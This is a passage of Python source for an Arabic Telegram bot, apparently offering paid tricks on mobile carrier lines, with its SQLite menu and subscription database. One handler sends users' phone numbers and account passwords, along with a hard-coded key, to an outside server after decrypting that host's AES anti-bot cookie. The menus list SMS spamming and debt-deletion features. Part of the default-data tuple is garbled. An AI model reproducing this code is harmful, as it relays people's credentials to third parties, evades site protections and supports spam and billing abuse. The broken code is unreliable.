    if user_data.get('action') != 'rahatabalk_confirm':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, "جاري التنفيذ...")
    msg = user_bot.send_message(user_id, f"{EMOJI['rahatabalk_egjbary']} *جاري تنفيذ ريح بالك اجباري...*\n\n⏳ انتظر لحظة...", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    
    try:
        API_URL = "https://moapp.great-site.net/api/voda_14"
        KEY = "e120685c4dabc9340b84a66acd3631e0"
        HEADERS = {"User-Agent": "Mozilla/5.0"}
        
        FAIL_WORDS = ("fail", "error", "invalid", "خطأ", "فشل", "غلط",
                      "incorrect", "wrong", "denied", "not found", "مش")
        
        session = requests.Session()
        
        # ── خطوة 1: جلب صفحة الحماية وحل الـ AES cookie
        r0 = session.get(API_URL, headers=HEADERS, timeout=15)
        
        if "toNumbers" in r0.text:
            try:
                from Crypto.Cipher import AES as _AES
                import re as _re
                a_val = _re.search(r'a=toNumbers\("([^"]+)"\)', r0.text).group(1)
                b_val = _re.search(r'b=toNumbers\("([^"]+)"\)', r0.text).group(1)
                c_val = _re.search(r'c=toNumbers\("([^"]+)"\)', r0.text).group(1)
                cipher = _AES.new(
                    bytes.fromhex(a_val),
                    _AES.MODE_CBC,
                    bytes.fromhex(b_val)
                )
                test_cookie = cipher.decrypt(bytes.fromhex(c_val)).hex()
                session.cookies.set("__test", test_cookie, domain="moapp.great-site.net")
            except:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل حل الحماية*\n\n"
                    f"❌ يرجى تثبيت pycryptodome: `pip install pycryptodome`",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
        
        # ── خطوة 2: الطلب الحقيقي
        r = session.get(
            API_URL,
            params={"key": KEY, "number": phone, "password": password, "i": "1"},
            headers=HEADERS,
            timeout=25,
        )
        
        raw = r.text.strip()
        
        if r.status_code != 200:
            user_bot.edit_message_text(
                f"{EMOJI['error']} *فشل الاتصال بالسيرفر*\n\n"
                f"❌ كود {r.status_code}",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return
        
        # ── parse JSON
        try:
            import json
            data = json.loads(raw)
            
            if data.get("success") is True:
                user_bot.edit_message_text(
                    f"{EMOJI['success']} *تم تنفيذ ريح بالك اجباري بنجاح!* 😮‍💨\n\n"
                    f"✅ تم تحويل الخط بنجاح",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            if data.get("success") is False:
                error_msg = data.get("reason") or data.get("message") or data.get("error") or str(data)[:200]
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ {error_msg}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            # fallback
            txt = str(data).lower()
            if any(k in txt for k in FAIL_WORDS):
                error_msg = data.get("reason") or data.get("message") or data.get("error") or str(data)[:200]
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ {error_msg}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            user_bot.edit_message_text(
                f"{EMOJI['success']} *تم تنفيذ ريح بالك اجباري بنجاح!* 😮‍💨\n\n"
                f"✅ تم تحويل الخط بنجاح",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return
            
        except Exception as e:
            raw_lower = raw.lower()
            if any(k in raw_lower for k in FAIL_WORDS):
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ {raw[:200]}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            user_bot.edit_message_text(
                f"{EMOJI['success']} *تم تنفيذ ريح بالك اجباري بنجاح!* 😮‍💨\n\n"
                f"✅ تم تحويل الخط بنجاح",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            
    except Exception as e:
        user_bot.edit_message_text(
            f"{EMOJI['error']} *حدث خطأ أثناء التنفيذ*\n\n"
            f"❌ {str(e)[:100]}",
            msg.chat.id, msg.message_id, parse_mode='Markdown'
        )

# ==================== قاعدة البيانات ====================
class Database:
    def __init__(self):
        if DELETE_OLD_DB_ON_START and os.path.exists(DB_FILE):
            try:
                os.remove(DB_FILE)
            except:
                pass
        
        self.conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        
        if self.is_database_empty():
            self.init_default_data()
        else:
            # تحديث قاعدة البيانات بإضافة الأزرار الجديدة إذا لم تكن موجودة
            self.add_missing_buttons()
    
    def create_tables(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                join_date TEXT,
                last_active TEXT,
                is_blocked INTEGER DEFAULT 0
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS levels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                display_name TEXT,
                parent_id INTEGER DEFAULT 0,
                level_type TEXT,
                emoji TEXT,
                content TEXT,
                is_active INTEGER DEFAULT 1,
                is_visible INTEGER DEFAULT 1,
                position INTEGER
            )
        ''')

        # جدول الاشتراكات المدفوعة
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS subscriptions (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                start_date TEXT,
                end_date TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')

        # جدول طلبات الاشتراك المعلقة
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS subscription_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT,
                first_name TEXT,
                from_number TEXT,
                request_date TEXT,
                screenshot_file_id TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')

        self.conn.commit()
    
    def is_database_empty(self):
        try:
            self.cursor.execute("SELECT COUNT(*) FROM levels WHERE parent_id = 0")
            count = self.cursor.fetchone()[0]
            return count == 0
        except:
            return True
    
    def add_missing_buttons(self):
        """إضافة الأزرار الجديدة إذا لم تكن موجودة في قاعدة البيانات"""
        other_id = self.get_id_by_name("other_section")
        if other_id:
            # إضافة زر تروكولر
            trucaller = self.get_item_by_name("trucaller")
            if not trucaller:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (other_id, "trucaller", f"{EMOJI['trucaller']} تروكولر", "main_button", EMOJI['trucaller'], None, 3, 1, 1))
                except Exception as e:
                    print(f"❌ فشل إضافة زر تروكولر: {e}")
            
            # إضافة زر فحص كاش
            wallet_search = self.get_item_by_name("wallet_search")
            if not wallet_search:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (other_id, "wallet_search", f"{EMOJI['wallet_search']} فحص كاش", "main_button", EMOJI['wallet_search'], None, 4, 1, 1))
                except Exception as e:
                    print(f"❌ فشل إضافة زر فحص كاش: {e}")
        
        # إضافة زر شحن كارت في قسم إدارة الخط
        manage_id = self.get_id_by_name("manage_section")
        if manage_id:
            recharge = self.get_item_by_name("recharge")
            if not recharge:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (manage_id, "recharge", f"{EMOJI['recharge']} شحن كارت", "main_button", EMOJI['recharge'], None, 11, 1, 1))
                except Exception as e:
                    print(f"❌ فشل إضافة زر شحن كارت: {e}")
            
            # نقل زر تحويل فليكسات إلى قسم إدارة الخط إذا لم يكن موجوداً فيه
            transfer_flex_in_manage = None
            try:
                self.cursor.execute("SELECT id FROM levels WHERE name = 'transfer_flex' AND parent_id = ?", (manage_id,))
                transfer_flex_in_manage = self.cursor.fetchone()
            except:
                pass
            if not transfer_flex_in_manage:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (manage_id, "transfer_flex", f"{EMOJI['transfer_flex']} تحويل فليكسات", "main_button", EMOJI['transfer_flex'], None, 4, 1, 1))
                    self.conn.commit()
                    print("✅ تم إضافة زر تحويل فليكسات في إدارة الخط")
                except Exception as e:
                    print(f"❌ فشل إضافة زر تحويل فليكسات في إدارة الخط: {e}")
        
        # إضافة أزرار جديدة في قسم الباقات والعروض
        packages_id = self.get_id_by_name("packages_section")
        if packages_id:
            riha_balak_offers = self.get_item_by_name("riha_balak_offers")
            if not riha_balak_offers:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (packages_id, "riha_balak_offers", f"{EMOJI['riha_balak_offers']} عروض ريح بالك", "main_button", EMOJI['riha_balak_offers'], None, 3, 1, 1))
                except Exception as e:
                    print(f"❌ فشل إضافة زر عروض ريح بالك: {e}")
            
            activate_21000 = self.get_item_by_name("activate_21000")
            if not activate_21000:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (packages_id, "activate_21000", f"{EMOJI['activate_21000']} تفعيل 21000 فليكس", "main_button", EMOJI['activate_21000'], None, 14, 1, 1))
                except Exception as e:
                    print(f"❌ فشل إضافة زر تفعيل 21000 فليكس: {e}")
            
            delete_debt_21000 = self.get_item_by_name("delete_debt_21000")
            if not delete_debt_21000:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (packages_id, "delete_debt_21000", f"{EMOJI['delete_debt_21000']} حذف مديونية 21000 فليكس", "main_button", EMOJI['delete_debt_21000'], None, 15, 1, 1))
                except Exception as e:
                    print(f"❌ فشل إضافة زر حذف مديونية 21000 فليكس: {e}")
            
            # حذف زر تمديد يومين (extend) إذا كان موجوداً
            extend_item = self.get_item_by_name("extend")
            if extend_item:
                try:
                    self.cursor.execute("DELETE FROM levels WHERE name = 'extend'")
                    self.conn.commit()
                    print("✅ تم حذف زر تمديد يومين")
                except Exception as e:
                    print(f"❌ فشل حذف زر تمديد يومين: {e}")
            
            # حذف زر تحويل فليكسات من قسم الباقات والعروض (نقله لإدارة الخط)
            try:
                self.cursor.execute(
                    "DELETE FROM levels WHERE name = 'transfer_flex' AND parent_id = ?", (packages_id,)
                )
                self.conn.commit()
            except Exception as e:
                print(f"❌ خطأ أثناء حذف transfer_flex من الباقات: {e}")
            
            # حذف زر ترحيل الفليكسات (carryover) من قسم الباقات والعروض إذا كان موجوداً
            try:
                self.cursor.execute(
                    "DELETE FROM levels WHERE name = 'carryover' AND parent_id = ?", (packages_id,)
                )
                self.conn.commit()
            except Exception as e:
                print(f"❌ خطأ أثناء حذف carryover من الباقات: {e}")
            
            # إضافة زر تزويد يومين إذا لم يكن موجوداً
            tazweed_2days = self.get_item_by_name("tazweed_2days")
            if not tazweed_2days:
                try:
                    self.cursor.execute('''
                        INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position, is_active, is_visible)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (packages_id, "tazweed_2days", f"{EMOJI['tazweed_2days']} تزويد يومين", "main_button", EMOJI['tazweed_2days'], None, 12, 1, 1))
                    self.conn.commit()
                    print("✅ تم إضافة زر تزويد يومين")
                except Exception as e:
                    print(f"❌ فشل إضافة زر تزويد يومين: {e}")
        
        # حذف زر تفاصيل نظامك إذا كان موجوداً
        system_details = self.get_item_by_name("system_details")
        if system_details:
            try:
                self.cursor.execute("DELETE FROM levels WHERE name = 'system_details'")
                self.conn.commit()
                print("✅ تم حذف زر تفاصيل نظامك")
            except Exception as e:
                print(f"❌ فشل حذف زر تفاصيل نظامك: {e}")
        
        # حذف زر شحن كارت القديم إذا كان موجوداً (لأننا أضفنا الجديد تحت إدارة الخط)
        old_charge_card = self.get_item_by_name("charge_card")
        if old_charge_card:
            try:
                self.cursor.execute("DELETE FROM levels WHERE name = 'charge_card'")
                self.conn.commit()
                print("✅ تم حذف زر شحن كارت القديم")
            except Exception as e:
                print(f"❌ فشل حذف زر شحن كارت القديم: {e}")
        
        # مبادلة أوضاع تجديد الباقة تلقائياً وحذف مديونية 21000 فليكس
        # حذف مديونية 21000 يجب أن يكون في موضع أقل من تجديد الباقة
        try:
            renew_item = self.get_item_by_name("renew")
            delete_debt_item = self.get_item_by_name("delete_debt_21000")
            if renew_item and delete_debt_item:
                renew_pos = None
                delete_pos = None
                self.cursor.execute("SELECT position FROM levels WHERE name = 'renew'")
                r = self.cursor.fetchone()
                if r: renew_pos = r[0]
                self.cursor.execute("SELECT position FROM levels WHERE name = 'delete_debt_21000'")
                r = self.cursor.fetchone()
                if r: delete_pos = r[0]
                # إذا كان renew قبل delete_debt_21000، نعكسهما
                if renew_pos is not None and delete_pos is not None and renew_pos < delete_pos:
                    self.cursor.execute("UPDATE levels SET position = ? WHERE name = 'renew'", (delete_pos,))
                    self.cursor.execute("UPDATE levels SET position = ? WHERE name = 'delete_debt_21000'", (renew_pos,))
                    self.conn.commit()
                    print("✅ تم تبادل أوضاع تجديد الباقة وحذف مديونية 21000")
        except Exception as e:
            print(f"❌ فشل تبادل الأوضاع: {e}")
        
        self.conn.commit()
    
    def init_default_data(self):
        # ملاحظة: تم حذف قسم "offers_section" (العروض المميزة) من القائمة الرئيسية
        level1_data = [
            ("packages_section", f"{EMOJI['packages']} الباقات والعروض", 0, "section", EMOJI['packages'], None, 1),
            ("manage_section", f"{EMOJI['manage']} إدارة الخط والحساب", 0, "section", EMOJI['manage'], None, 2),
            ("internet_section", f"{EMOJI['internet']} إدارة باقات الانترنت", 0, "section", EMOJI['internet'], None, 3),
            ("family_section", f"{EMOJI['family']} إدارة نظام فاميلي", 0, "section", EMOJI['family'], None, 4),
            ("other_section",("family_dashboard_section",
"👨‍👩‍👧 إدارة العائلة", 0, "section", "👨‍👩‍👧", None, 5),
f"{EMOJI['other']} الخدمات الأخرى", 0, "section", EMOJI['other'], None, 6)
        ]
        
        for name, display, parent, ltype, emoji, content, pos in level1_data:
            self.cursor.execute(
                "INSERT INTO levels (name, display_name, parent_id, level_type, emoji, content, position) VALUES (?, ?, ?, ?, ?, ?, ?)",
                (name, display, parent, ltype, emoji, content, pos)
            )
        
        self.conn.commit()
        
        packages_id = self.get_id_by_name("packages_section")
        manage_id = self.get_id_by_name("manage_section")
        internet_id = self.get_id_by_name("internet_section")
        family_id = self.get_id_by_name("family_section")
        other_id = self.get_id_by_name("other_section")
        
        if packages_id:
            packages_buttons = [
                (packages_id, "flex", f"{EMOJI['flex']} باقات فليكس", "main_button", EMOJI['flex'], None, 1),
                (packages_id, "rahatabalk_egjbary", f"{EMOJI['rahatabalk_egjbary']} ريح بالك اجباري", "main_button", EMOJI['rahatabalk_egjbary'], None, 2),
                (packages_id, "riha_balak_offers", f"{EMOJI['riha_balak_offers']} عروض ريح بالك", "main_button", EMOJI['riha_balak_offers'], None, 3),
                (packages_id, "flex_discount", f"{EMOJI['flex_discount']} خصم فليكس", "main_button", EMOJI['flex_discount'], None, 3),
                (packages_id, "offers_365", f"{EMOJI['offers_365']} عروض 365", "main_button", EMOJI['offers_365'], None, 4),
                (packages_id, "note_packages", f"{EMOJI['note_packages']} باقات ع نوته", "main_button", EMOJI['note_packages'], None, 5),
                # زر تمديد يومين (extend) تم حذفه
                (packages_id, "convert_14", f"{EMOJI['convert_14']} تحويل 14 قرش", "main_button", EMOJI['convert_14'], None, 6),
                (packages_id, "note_15", f"{EMOJI['note_15']} نوته فليكس 15", "main_button", EMOJI['note_15'], None, 7),
                (packages_id, "delete_debt_21000", f"{EMOJI['delete_debt_21000']} حذف مديونية 21000 فليكس", "main_button", EMOJI['delete_debt_21000'], None, 8),
                (packages_id, "activate_21000", f"{EMOJI['activate_21000']} تفعيل 21000 فليكس", "main_button", EMOJI['activate_21000'], None, 9),
                (packages_id, "moneyback", f"{EMOJI['moneyback']} money back 💰", "main_button", EMOJI['moneyback'], None, 10),
                (packages_id, "renew", f"{EMOJI['renew']} تجديد الباقه تلقائيا", "main_button", EMOJI['renew'], None, 11),
                (packages_id, "tazweed_2days", f"{EMOJI['tazweed_2days']} تزويد يومين", "main_button", EMOJI['tazweed_2days'], None, 12)
            ]
            self.add_buttons(packages_buttons)
        
        if manage_id:
            manage_buttons = [
                (manage_id, "line_data", f"{EMOJI['line_data']} بيانات الخط", "main_button", EMOJI['line_data'], None, 1),
                (manage_id, "stop_line", f"{EMOJI['stop_line']} إيقاف الخط", "main_button", EMOJI['stop_line'], None, 2),
                (manage_id, "transfer_balance", f"{EMOJI['transfer_balance']} تحويل رصيد", "main_button", EMOJI['transfer_balance'], None, 3),
                (manage_id, "transfer_flex", f"{EMOJI['transfer_flex']} تحويل فليكسات", "main_button", EMOJI['transfer_flex'], None, 4),
                (manage_id, "calls_log", f"{EMOJI['calls_log']} سجل مكالمات", "main_button", EMOJI['calls_log'], None, 5),
                (manage_id, "due_balance", f"{EMOJI['due_balance']} الرصيد المستحق", "main_button", EMOJI['due_balance'], None, 6),
                (manage_id, "change_pass", f"{EMOJI['change_pass']} تغيير كلمة المرور", "main_button", EMOJI['change_pass'], None, 7),
                (manage_id, "cards", f"{EMOJI['cards']} كروت فكه و مارد", "main_button", EMOJI['cards'], None, 8),
                (manage_id, "line_report", f"{EMOJI['line_report']} تقرير الخط", "main_button", EMOJI['line_report'], None, 9),
                (manage_id, "my_subs", f"{EMOJI['my_subs']} اشتراكاتي", "main_button", EMOJI['my_subs'], None, 10),
                (manage_id, "recharge", f"{EMOJI['recharge']} شحن كارت", "main_button", EMOJI['recharge'], None, 11)
            ]
            self.add_buttons(manage_buttons)
        
        if internet_id:
            internet_buttons = [
                (internet_id, "plus", f"{EMOJI['plus']} باقات Plus", "main_button", EMOJI['plus'], None, 1),
                (internet_id, "extreme", f"{EMOJI['extreme']} باقات اكستريم", "main_button", EMOJI['extreme'], None, 2),
                (internet_id, "apps", f"{EMOJI['apps']} باقات التطبيقات", "main_button", EMOJI['apps'], None, 3),
                (internet_id, "next_month", f"{EMOJI['next_month']} عرض النت (الشهر الثاني)", "main_button", EMOJI['next_month'], None, 4)
            ]
            self.add_buttons(internet_buttons)
        
        if family_id:
            family_buttons = [
                (family_id, "send_invite", f"{EMOJI['send_invite']} ارسال دعوه", "main_button", EMOJI['send_invite'], None, 1),
                (family_id, "accept_invite", f"{EMOJI['accept_invite']} قبول دعوه", "main_button", EMOJI['accept_invite'], None, 2),
                (family_id, "delete_member", f"{EMOJI['delete_member']} حذف فرد", "main_button", EMOJI['delete_member'], None, 4),
                (family_id, "change_percent", f"{EMOJI['change_percent']} تغيير النسبه", "main_button", EMOJI['change_percent'], None, 5),
                (family_id, "owner_percent", f"{EMOJI['owner_percent']} معرفه نسبه الاونر", "main_button", EMOJI['owner_percent'], None, 6),
                (family_id, "owner_number", f"{EMOJI['owner_number']} معرفه رقم الاونر", "main_button", EMOJI['owner_number'], None, 7),
            ]
            self.add_buttons(family_buttons)
        
        if other_id:
            other_buttons = [
                (other_id, "report", f"{EMOJI['report']} الإبلاغ عن رقم مزعج", "main_button", EMOJI['report'], None, 1),
                (other_id, "spam_messages", f"{EMOJI['spam_messages']} اسبام رسايل", "main_button", EMOJI['spam_messages'], None, 2),
                (other_id, "trucaller", f"{EMOJI['trucaller']} تروكولر", "main_button", EMOJI['trucaller'], None, 3),
                (other_id, "wallet_search", f"{EMOJI['wallet_search']} فحص كاش", "main_button", EMOJI['wallet_search'], None, 4)
            ]
            self.add_buttons(other_buttons)
        
        self.conn.commit()
    
    def add_buttons(self, buttons_list):
        for parent, name, display, ltype, emoji, content, pos in buttons_list:
            try:
                self.cursor.execute(
                    "INSERT INTO levels (parent_id, name, display_name, level_type, emoji, content, position) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (parent, name, display, ltype, emoji, content, pos)
                )
            except:
                pass
    
    def get_id_by_name(self, name):
        try:
            self.cursor.execute("SELECT id FROM levels WHERE name = ?", (name,))
            result = self.cursor.fetchone()
            return result[0] if result else None
        except:
            return None
    
    def add_user(self, user_id, username, first_name):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            self.cursor.execute(
                "INSERT OR REPLACE INTO users (user_id, username, first_name, join_date, last_active) VALUES (?, ?, ?, ?, ?)",
                (user_id, username, first_name, now, now)
            )
            self.conn.commit()
        except:
            pass
    
    def update_user_activity(self, user_id):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            self.cursor.execute(
                "UPDATE users SET last_active = ? WHERE user_id = ?",
                (now, user_id)
            )
            self.conn.commit()
        except:
            pass
    
    def get_users_count(self):
        try:
            self.cursor.execute("SELECT COUNT(*) FROM users")
            return self.cursor.fetchone()[0]
        except:
            return 0
    
    def get_today_users_count(self):
        try:
            today = datetime.now().strftime("%Y-%m-%d")
            self.cursor.execute("SELECT COUNT(*) FROM users WHERE DATE(last_active) = ?", (today,))
            return self.cursor.fetchone()[0]
        except:
            return 0
    
    def get_month_users_count(self):
        try:
            month = datetime.now().strftime("%Y-%m")
            self.cursor.execute("SELECT COUNT(*) FROM users WHERE strftime('%Y-%m', last_active) = ?", (month,))
            return self.cursor.fetchone()[0]
        except:
            return 0
    
    def get_all_users(self):
        try:
            self.cursor.execute("SELECT user_id FROM users")
            return [row[0] for row in self.cursor.fetchall()]
        except:
            return []
    
    def get_level1_items(self):
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active FROM levels WHERE parent_id = 0 AND level_type = 'section' AND is_visible = 1 ORDER BY position"
            )
            return self.cursor.fetchall()
        except:
            return []
    
    def get_level2_items(self, parent_id):
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active FROM levels WHERE parent_id = ? AND level_type = 'main_button' AND is_visible = 1 ORDER BY position",
                (parent_id,)
            )
            return self.cursor.fetchall()
        except:
            return []
    
    def get_level3_items(self, parent_id):
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, content, is_active FROM levels WHERE parent_id = ? AND level_type = 'sub_button' AND is_visible = 1 ORDER BY position",
                (parent_id,)
            )
            return self.cursor.fetchall()
        except:
            return []
    
    def get_item_by_id(self, item_id):
        try:
            self.cursor.execute(
                "SELECT id, parent_id, name, display_name, level_type, emoji, content, is_active, is_visible FROM levels WHERE id = ?",
                (item_id,)
            )
            return self.cursor.fetchone()
        except:
            return None
    
    def get_item_by_name(self, name):
        try:
            self.cursor.execute(
                "SELECT id, parent_id, name, display_name, level_type, emoji, content, is_active, is_visible FROM levels WHERE name = ?",
                (name,)
            )
            return self.cursor.fetchone()
        except:
            return None
    
    def get_all_level1(self):
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active, is_visible, position FROM levels WHERE parent_id = 0 AND level_type = 'section' ORDER BY position"
            )
            return self.cursor.fetchall()
        except:
            return []
    
    def get_all_level2(self, section_id=None):
        if section_id:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active, is_visible, position FROM levels WHERE parent_id = ? AND level_type = 'main_button' ORDER BY position",
                (section_id,)
            )
        else:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active, is_visible, position FROM levels WHERE level_type = 'main_button' ORDER BY position"
            )
        return self.cursor.fetchall()
    
    def get_all_level2_flat(self):
        """جلب كل أزرار المستوى الثاني من كل الأقسام"""
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active, parent_id FROM levels WHERE level_type = 'main_button' AND is_visible = 1 ORDER BY parent_id, position"
            )
            return self.cursor.fetchall()
        except:
            return []
    
    def get_all_level3_flat(self):
        """جلب كل أزرار المستوى الثالث"""
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, content, is_active FROM levels WHERE level_type = 'sub_button' AND is_visible = 1 ORDER BY parent_id, position"
            )
            return self.cursor.fetchall()
        except:
            return []

    def get_all_level3(self, parent_id):
        try:
            self.cursor.execute(
                "SELECT id, display_name, emoji, is_active, is_visible, position FROM levels WHERE parent_id = ? AND level_type = 'sub_button' ORDER BY position",
                (parent_id,)
            )
            return self.cursor.fetchall()
        except:
            return []

    def update_item_status(self, item_id, field, value):
        try:
            self.cursor.execute(f"UPDATE levels SET {field} = ? WHERE id = ?", (value, item_id))
            self.conn.commit()
            return True
        except:
            return False

    def update_item_content(self, item_id, content):
        try:
            self.cursor.execute("UPDATE levels SET content = ? WHERE id = ?", (content, item_id))
            self.conn.commit()
            return True
        except:
            return False

    def delete_item(self, item_id):
        try:
            # حذف العنصر وكل أبنائه بشكل متكرر
            self.cursor.execute("SELECT id FROM levels WHERE parent_id = ?", (item_id,))
            children = [r[0] for r in self.cursor.fetchall()]
            for child_id in children:
                self.delete_item(child_id)
            self.cursor.execute("DELETE FROM levels WHERE id = ?", (item_id,))
            self.conn.commit()
            return True
        except:
            return False

    def add_level1(self, name, display_name, emoji_icon, position):
        try:
            self.cursor.execute(
                "INSERT INTO levels (name, display_name, parent_id, level_type, emoji, position) VALUES (?, ?, 0, 'section', ?, ?)",
                (name, display_name, emoji_icon, position)
            )
            self.conn.commit()
            return self.cursor.lastrowid
        except:
            return None

    def add_level2(self, parent_id, name, display_name, emoji_icon, position):
        try:
            self.cursor.execute(
                "INSERT INTO levels (name, display_name, parent_id, level_type, emoji, position) VALUES (?, ?, ?, 'main_button', ?, ?)",
                (name, display_name, parent_id, emoji_icon, position)
            )
            self.conn.commit()
            return self.cursor.lastrowid
        except:
            return None

    def add_level3(self, parent_id, name, display_name, emoji_icon, content, position):
        try:
            self.cursor.execute(
                "INSERT INTO levels (name, display_name, parent_id, level_type, emoji, content, position) VALUES (?, ?, ?, 'sub_button', ?, ?, ?)",
                (name, display_name, parent_id, emoji_icon, content, position)
            )
            self.conn.commit()
            return self.cursor.lastrowid
        except:
            return None

    def is_user_subscribed(self, user_id):
        """التحقق من اشتراك المستخدم"""
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.cursor.execute(
                "SELECT 1 FROM subscriptions WHERE user_id = ? AND is_active = 1 AND end_date >= ?",
                (user_id, now)
            )
            return self.cursor.fetchone() is not None
        except:
            return False

    def add_subscription(self, user_id, username, first_name, months=1):
        """إضافة اشتراك لمستخدم"""
        now = datetime.now()
        # إذا كان عنده اشتراك نشط، نمدده
        self.cursor.execute("SELECT end_date FROM subscriptions WHERE user_id = ? AND is_active = 1", (user_id,))
        row = self.cursor.fetchone()
        if row:
            try:
                existing_end = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
                if existing_end > now:
                    start_from = existing_end
                else:
                    start_from = now
            except:
                start_from = now
        else:
            start_from = now
        end_date = start_from + timedelta(days=30 * months)
        self.cursor.execute('''
            INSERT OR REPLACE INTO subscriptions (user_id, username, first_name, start_date, end_date, is_active)
            VALUES (?, ?, ?, ?, ?, 1)
        ''', (user_id, username or "", first_name or "", now.strftime("%Y-%m-%d %H:%M:%S"), end_date.strftime("%Y-%m-%d %H:%M:%S")))
        self.conn.commit()
        return end_date

    def remove_subscription(self, user_id):
        """حذف اشتراك مستخدم"""
        try:
            self.cursor.execute("DELETE FROM subscriptions WHERE user_id = ?", (user_id,))
            self.conn.commit()
            return True
        except:
            return False

    def get_subscription_info(self, user_id):
        """معلومات اشتراك المستخدم"""
        try:
            self.cursor.execute("SELECT * FROM subscriptions WHERE user_id = ?", (user_id,))
            return self.cursor.fetchone()
        except:
            return None

    def get_all_subscribed_users(self):
        """جلب كل المشتركين النشطين"""
        try:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.cursor.execute("SELECT user_id, username, first_name, end_date FROM subscriptions WHERE is_active = 1 AND end_date >= ?", (now,))
            return self.cursor.fetchall()
        except:
            return []

    def is_user_blocked(self, user_id):
        """هل المستخدم محظور"""
        try:
            self.cursor.execute("SELECT is_blocked FROM users WHERE user_id = ?", (user_id,))
            row = self.cursor.fetchone()
            return row and row[0] == 1
        except:
            return False

    def block_user(self, user_id):
        """حظر مستخدم"""
        try:
            self.cursor.execute("UPDATE users SET is_blocked = 1 WHERE user_id = ?", (user_id,))
            self.conn.commit()
            return True
        except:
            return False

    def unblock_user(self, user_id):
        """إلغاء حظر مستخدم"""
        try:
            self.cursor.execute("UPDATE users SET is_blocked = 0 WHERE user_id = ?", (user_id,))
            self.conn.commit()
            return True
        except:
            return False

    def save_subscription_request(self, user_id, username, first_name, from_number, screenshot_file_id):
        """حفظ طلب اشتراك"""
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.cursor.execute('''
            INSERT INTO subscription_requests (user_id, username, first_name, from_number, request_date, screenshot_file_id, status)
            VALUES (?, ?, ?, ?, ?, ?, 'pending')
        ''', (user_id, username or "", first_name or "", from_number, now, screenshot_file_id))
        self.conn.commit()
        return self.cursor.lastrowid


# ==================== إنشاء كائن قاعدة البيانات ====================
db = Database()

# ==================== حالة البوت ====================
bot_status = {
    "is_running": True,
    "maintenance_mode": False,
    "admin_action": None,
    "temp_data": {},
    "user_data": {},
    "user_nav": {},
